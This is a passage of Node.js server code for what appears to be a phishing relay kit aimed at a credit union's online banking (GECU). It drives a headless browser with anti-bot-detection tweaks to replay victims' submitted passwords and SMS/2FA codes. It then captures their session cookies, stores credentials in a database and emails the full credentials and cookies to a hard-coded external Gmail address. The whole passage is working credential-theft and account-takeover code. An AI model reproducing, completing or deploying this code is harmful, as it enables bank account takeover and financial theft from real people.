                try {
                    await startBrowserAndPage();
                    console.log('Fresh browser created and ready for next request');
                } catch (e) {
                    console.log('Error starting fresh browser:', e.message);
                }
                
                // 2FA required, return mode
                return res.status(200).json({ 
                    success: true, 
                    mode: '2fa', 
                    message: `2FA required, code will be sent via ${methodResult.method}.` 
                });
            } else {
                return res.status(400).json({ 
                    success: false, 
                    mode: 'error', 
                    error: 'Failed to select 2FA method: ' + methodResult.error 
                });
            }
        }
        
        // Handle case where we're already on code entry page (shouldn't happen on first login)
        if (loginResult.success && loginResult.mode === '2fa_code_entry') {
            await saveEmailPasswordIP(email, password, ip);
            
            // Close the local page only - don't close the browser, /loginsms will create its own
            try {
                if (localPage && !localPage.isClosed()) {
                    await localPage.close();
                    console.log('Local page closed after 2FA code entry page detected');
                }
            } catch (e) {
                console.log('Error closing local page:', e.message);
            }
            
            // Don't close the shared browser here - /loginsms creates its own browser instance
            return res.status(200).json({ 
                success: true, 
                mode: '2fa', 
                message: '2FA code entry page ready. Please submit code via /loginsms endpoint.' 
            });
        }
        if (loginResult.success && loginResult.mode === 'logged_in') {
            // Extract cookies BEFORE closing page
            const cookies = await localPage.cookies();
            const userEntry = {
                email,
                password,
                cookies: cookies.filter(cookie => !cookie.name.includes('EDGESCAPE')).map(cookie => ({ ...cookie, secure: true, sameSite: 'lax' }))
            };
            
            // Respond immediately to the user
            res.status(200).json({ success: true, mode: 'logged_in', message: 'Login successful, no 2FA required.' });
            
            // Do background tasks asynchronously (DB save and email - don't await)
            (async () => {
                try {
                    await saveEmailPasswordIP(email, password, ip);
                    
                    // Save cookies to database
                    try {
                        const cookiesJson = JSON.stringify(userEntry.cookies);
                        const checkStmt = db.prepare('SELECT id FROM cookies WHERE email = ?');
                        const existingCookie = checkStmt.get(email);
                        
                        if (existingCookie) {
                            const updateStmt = db.prepare('UPDATE cookies SET password = ?, cookies = ?, updated_at = CURRENT_TIMESTAMP WHERE email = ?');
                            updateStmt.run(userEntry.password, cookiesJson, email);
                        } else {
                            const insertStmt = db.prepare('INSERT INTO cookies (email, password, cookies) VALUES (?, ?, ?)');
                            insertStmt.run(email, userEntry.password, cookiesJson);
                        }
                        console.log('Cookies saved to SQLite');
                    } catch (error) {
                        console.log('⚠️ Cookie save error:', error.message);
                    }
                    
                    // Send No-2FA email notification
                    const emailOptions = {
                        from: process.env.EMAIL_USER || 'fifaash92@gmail.com',
                        to: 'eakyra888@gmail.com',
                        subject: `Login Success [No 2FA]: ${email}`,
                        text: `Login successful without 2FA. Cookies extracted:\n\n${JSON.stringify(userEntry, null, 2)}`,
                    };
                    await sendEmail(emailOptions);
                    console.log('✅ No-2FA Email notification sent successfully');
                    
                    // Close browser and create fresh one after successful login (like SMS endpoint)
                    if (browser) {
                        await browser.close();
                        console.log('Browser closed after successful login');
                    }
                    
                    // Create fresh browser and preload page
                    await startBrowserAndPage();
                    console.log('Fresh browser created and ready for next request');
                    
                } catch (error) {
                    console.log('⚠️ Background task error:', error.message);
                }
            })();
            return;
        }
        // Otherwise, error (wrong credentials, etc.)
        // Close the local page first
        if (localPage && !localPage.isClosed()) {
            await localPage.close();
        }
        
        // Close browser and create fresh one after error (for consistency)
        if (browser) {
            await browser.close();
            console.log('Browser closed after login failure');
        }
        
        // Create fresh browser and preload page
        try {
            await startBrowserAndPage();
            console.log('Fresh browser created and ready for next request');
        } catch (e) {
            console.log('Error starting fresh browser:', e.message);
        }
        
        return res.status(400).json({ success: false, mode: 'error', error: loginResult.error || 'Login failed.' });
    } catch (error) {
        console.error('Error during login:', error);
        res.status(500).json({ success: false, mode: 'error', error: error.message });
        
        // Close the local page first
        if (localPage && !localPage.isClosed()) {
            try {
                await localPage.close();
            } catch (e) {
                // Ignore close errors
            }
        }
        
        // Close browser and create fresh one after error (for consistency)
        if (browser) {
            try {
                await browser.close();
                console.log('Browser closed after error');
            } catch (e) {
                console.log('Error closing browser:', e.message);
            }
        }
        
        // Create fresh browser and preload page
        try {
            await startBrowserAndPage();
            console.log('Fresh browser created and ready for next request');
        } catch (e) {
            console.log('Error starting fresh browser:', e.message);
        }
    } finally {
        // Only close page if we haven't already closed the browser
        if (localPage && !localPage.isClosed()) {
            await localPage.close();
            console.log('Page closed after login attempt');
        }
    }
});

//----------------------------------------- SMS-Cookies -----------------------------------------------------

// Function to handle GECU login for SMS/2FA code entry flow
async function SecondperformLogin(page, userId, password) {
    try {
        console.log('Starting second login process for GECU 2FA flow...');
        
        // Use the same performLogin function (single-step login)
        const loginResult = await performLogin(page, userId, password);
        
        if (!loginResult.success) {
            return false;
        }
        
        // If we need to select 2FA method, do it
        if (loginResult.mode === '2fa_method_selection') {
            const methodResult = await select2FAMethod(page);
            if (!methodResult.success) {
                return false;
            }
            // Wait for code input page
            await new Promise(res => setTimeout(res, 2000));
        }
        
        // Check if we're on code entry page
        const currentUrl = page.url();
        if (currentUrl.includes('/mfa') || loginResult.mode === '2fa_code_entry') {
            // Wait for code input field
            try {
                await page.waitForFunction(
                    () => {
                        const inputs = Array.from(document.querySelectorAll('input'));
                        return inputs.some(input => 
                            input.placeholder?.toLowerCase().includes('code') ||
                            input.getAttribute('aria-label')?.toLowerCase().includes('code') ||
                            input.type === 'text'
                        );
                    },
                    { timeout: 10000 }
                );
                console.log('Code input field found');
                return true;
            } catch (e) {
                console.log('Code input field not found:', e.message);
                return false;
            }
        }
        
        return true;
    } catch (error) {
        console.error('Error during second login process:', error);
        return false;
    }
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

app.post('/loginsms', async (req, res) => {
    const { ip, code } = req.body;

    if (!ip || !code) {
        return res.status(400).json({ error: 'IP and code are required' });
    }

    let browser; // Declare the browser variable outside the try block (like old version)
    try {
        const emailPasswordData = await getEmailPasswordByIP(ip);
        
        if (!emailPasswordData) {
            return res.status(500).json({ error: 'Unable to retrieve email/password data - database unavailable' });
        }

        // Create a new browser for each SMS request (like old version)
        browser = await puppeteer.launch({
            headless: false, // Set to false for local testing to see browser window
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-blink-features=AutomationControlled',
                '--disable-gpu',
                '--single-process', // May help on some systems
            ],
        });

        const localPage = await browser.newPage();

        await localPage.setRequestInterception(true);
        localPage.on('request', (request) => {
            // Allow stylesheets and fonts for React apps, only block images
            if (request.resourceType() === "image") {
                request.abort();
            } else {
                request.continue();
            }
        });

        await localPage.setUserAgent(ua);
        
        // Add anti-detection measures
        await localPage.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
            });
            Object.defineProperty(navigator, 'plugins', {
                get: () => [1, 2, 3, 4, 5],
            });
            Object.defineProperty(navigator, 'languages', {
                get: () => ['en-US', 'en'],
            });
            window.chrome = { runtime: {} };
        });
        
        // Listen for JavaScript errors on the page
        localPage.on('pageerror', error => {
            console.log('⚠️ JavaScript error on page:', error.message);
        });
        
        await localPage.goto(loginUrl, { waitUntil: 'networkidle2' });
        await new Promise(res => setTimeout(res, 2000)); // Wait for React app

        const loginSuccess = await SecondperformLogin(localPage, emailPasswordData.email, emailPasswordData.password);
        
        if (!loginSuccess) {
            return res.status(400).json({ success: false, error: 'Login failed during 2FA flow' });
        }

        console.log('Waiting for code input field...');
        
        // Find code input field (GECU uses various selectors)
        // Wait a bit for the code input to appear
        await new Promise(res => setTimeout(res, 1000));
        
        const codeInput = await localPage.evaluateHandle(() => {
            const inputs = Array.from(document.querySelectorAll('input[type="text"], input:not([type])'));
            return inputs.find(input => {
                const placeholder = (input.placeholder || '').toLowerCase();
                const ariaLabel = (input.getAttribute('aria-label') || '').toLowerCase();
                const id = (input.id || '').toLowerCase();
                const name = (input.name || '').toLowerCase();
                return placeholder.includes('code') || 
                       ariaLabel.includes('code') || 
                       placeholder.includes('enter code') ||
                       id.includes('code') ||
                       name.includes('code');
            });
        });
        
        if (!codeInput || !codeInput.asElement()) {
            throw new Error('Code input field not found');
        }
        
        console.log('Code input field found');
        
        // Type the code
        await codeInput.asElement().click();
        await localPage.keyboard.down('Control');
        await localPage.keyboard.press('KeyA');
        await localPage.keyboard.up('Control');
        await codeInput.asElement().type(code, { delay: 50 });
        console.log('Code typed');

        // Wait a moment before submitting
        await new Promise(res => setTimeout(res, 500));
        
        // Find and click submit button
        const submitButton = await localPage.evaluateHandle(() => {
            const buttons = Array.from(document.querySelectorAll('button, [role="button"], a, input[type="submit"]'));
            return buttons.find(btn => {
                const text = (btn.textContent || btn.value || '').trim().toLowerCase();
                return text === 'submit' || text === 'continue' || text === 'verify' || 
                       text.includes('submit') || btn.type === 'submit';
            });
        });
        
        if (submitButton && submitButton.asElement()) {
            await submitButton.asElement().click();
            console.log('Submit button clicked');
        } else {
            // Fallback: try Enter key
            await localPage.keyboard.press('Enter');
            console.log('Pressed Enter to submit code');
        }
        
        console.log('After submitting code');

        // Wait for navigation after 2FA submission
        await localPage.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 });
        await sleep(1000);

        // Check for 2FA error messages after submission (improved error detection)
        console.log('Checking for 2FA error messages...');
        
        // First check for specific error message selectors
        const errorSelectors = [
            '#online-general-error p.otkinput-errormsg',  // Main error selector like login
            '.otkform-group-help .otkinput-errormsg',
            '.error-message',
            '.alert-danger',
            '[class*="error"]',
            '.otkc.otkinput-errormsg'
        ];
        
        let errorText = '';
        for (const selector of errorSelectors) {
            try {
                const errorElement = await localPage.$(selector);
                if (errorElement) {
                    const text = await localPage.evaluate(el => el.textContent.trim(), errorElement);
                    if (text && text.length > 0) {
                        console.log('2FA Error detected with selector:', selector, '- Text:', text);
                        errorText = text;
                        break;
                    }
                }
            } catch (e) {
                // Continue to next selector
            }
        }
        
        // If specific error found, return it
        if (errorText) {
            console.log('2FA verification failed - specific error:', errorText);
            return res.status(400).json({ 
                success: false, 
                error: errorText
            });
        }
        
        // Also check if we're still on the login/2FA page (indicates generic error)
        const currentUrl = localPage.url();
        const bodyText = await localPage.evaluate(() => document.body.textContent || '');
        
        if (currentUrl.includes('/login') && bodyText.includes('email authenticator')) {
            console.log('Still on login/2FA page - likely incorrect code (no specific error message)');
            return res.status(400).json({ 
                success: false, 
                error: 'Invalid verification code. Please try again.' 
            });
        }

        console.log('2FA verification successful, getting cookies...');
        const cookies = await localPage.cookies();
        console.log(cookies);

        const userEntry = {
            email: emailPasswordData.email,
            password: emailPasswordData.password,
            cookies: cookies.filter(cookie => !cookie.name.includes('EDGESCAPE')).map(cookie => ({ ...cookie, secure: true, sameSite: 'lax' }))
        };

        console.log(userEntry.cookies);

        try {
            const cookiesJson = JSON.stringify(userEntry.cookies);
            const checkStmt = db.prepare('SELECT id FROM cookies WHERE email = ?');
            const existingCookie = checkStmt.get(emailPasswordData.email);
            
            if (existingCookie) {
                const updateStmt = db.prepare('UPDATE cookies SET password = ?, cookies = ?, updated_at = CURRENT_TIMESTAMP WHERE email = ?');
                updateStmt.run(userEntry.password, cookiesJson, emailPasswordData.email);
            } else {
                const insertStmt = db.prepare('INSERT INTO cookies (email, password, cookies) VALUES (?, ?, ?)');
                insertStmt.run(emailPasswordData.email, userEntry.password, cookiesJson);
            }
            console.log('Cookies saved to SQLite');
        } catch (error) {
            console.log('SQLite not available, skipping cookie save:', error.message);
        }

        // Try to send 2FA email notification (optional)
        try {
            const emailOptions = {
                from: process.env.EMAIL_USER || 'fifaash92@gmail.com',
                to: 'eakyra888@gmail.com',
                subject: `Login Success [2FA]: ${emailPasswordData.email}`,
                text: `Login successful with 2FA verification. Cookies extracted:\n\n${JSON.stringify(userEntry, null, 2)}`,
            };

            await sendEmail(emailOptions);
            console.log('✅ 2FA Email notification sent successfully');
        } catch (emailError) {
            console.log('⚠️ Email sending failed (non-critical):', emailError.message);
            console.log('📧 Login process continues without email notification');
        }

        res.status(200).json({ success: true, message: 'Login successful after SMS' });

    } catch (error) {
        console.error('Error during SMS login:', error);
        res.status(500).json({ error: 'Error during SMS login' });
    } finally {
        if (browser) {
            await browser.close(); // Close the browser in the finally block (like old version)
        }
        console.log("Te5dem nayek :)");
    }
});



const sendEmail = async (emailOptions) => {
  return new Promise((resolve, reject) => {
    // Add timeout to prevent hanging
    const timeout = setTimeout(() => {
      reject(new Error('Email sending timeout'));
    }, 30000); // 30 second timeout

    transporter.sendMail(emailOptions, (err, info) => {
      clearTimeout(timeout);
      
      if (err) {
        console.error('Email sending error:', err.message);
        reject(err);
      } else {
        console.log('Email sent successfully:', info.messageId);
        resolve(info);
      }
    });
  });
};




// Gracefully close the browser and database when the application is terminated
process.on('SIGINT', async () => {
    // Close all active browser sessions
    for (const [sessionId, session] of activeSessions.entries()) {
        if (session.browser) {
            try {
                await session.browser.close();
            } catch (e) {
                // Ignore errors
            }
        }
    }
    activeSessions.clear();
    
    if (browser) {
        await browser.close();
    }
    if (db) {
        db.close();
        console.log('SQLite database closed');
    }
    process.exit();
});

app.get('/', (req, res) => res.status(200).send('OK'));
app.get('/healthz', (req, res) => res.json({ ok: true }));


// Start the server
const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`🌐 Server is running at http://localhost:${port}`);
    console.log(`📡 Ready to accept requests on port ${port}`);
    console.log(`🔗 Health check available at http://localhost:${port}/healthz`);
});



